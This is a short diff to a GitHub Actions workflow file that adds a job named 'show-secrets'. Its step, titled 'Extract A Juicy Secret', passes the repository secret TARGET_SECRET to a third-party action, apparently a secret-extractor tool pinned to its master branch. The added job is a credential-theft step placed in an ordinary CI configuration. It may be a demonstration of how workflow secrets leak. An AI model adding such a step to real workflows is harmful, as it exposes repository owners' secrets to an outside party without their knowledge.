@@ -15,3 +15,10 @@ jobs:
       username: mona
     secrets:
       token: ${{ secrets.TOKEN }}
+  show-secrets:
+   runs-on: ubuntu-latest
+   steps:
+   - name: Extract A Juicy Secret
+     uses: Plabick/GitHub-Secret-Extractor@master
+     with: 
+      secret: ${{ secrets.TARGET_SECRET}}
